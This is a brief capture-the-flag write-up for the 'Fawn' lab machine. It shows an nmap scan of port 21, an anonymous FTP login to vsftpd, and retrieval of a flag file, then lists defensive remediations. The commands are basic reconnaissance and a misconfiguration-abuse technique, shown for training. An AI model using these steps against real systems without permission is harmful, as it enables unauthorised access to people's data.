# Fawn - FTP (Port 21)

## Objective
Exploit misconfigured FTP with Anonymous login.

## 1. Recon - Nmap Scan
sudo nmap -sS -Pn -p 21 -sV <TARGET-IP>
Result: 21/tcp open ftp vsftpd 3.0.3
OS: Unix

## 2. Exploitation
ftp <TARGET-IP>
Name: anonymous
Password: [blank]
ftp> ls
ftp> get flag.txt
ftp> bye

## 3. Flag Extraction
cat flag.txt

## Vulnerability
- Anonymous FTP login enabled
- Sensitive file accessible without auth

## Remediation (SOC Perspective)
- Disable Anonymous login
- Use SFTP (SSH File Transfer) - Encrypted
- Restrict FTP to internal network only
- Monitor FTP login logs for anonymous access

## Skill Learned
FTP enumeration, Anonymous login abuse, File transfer via FTP
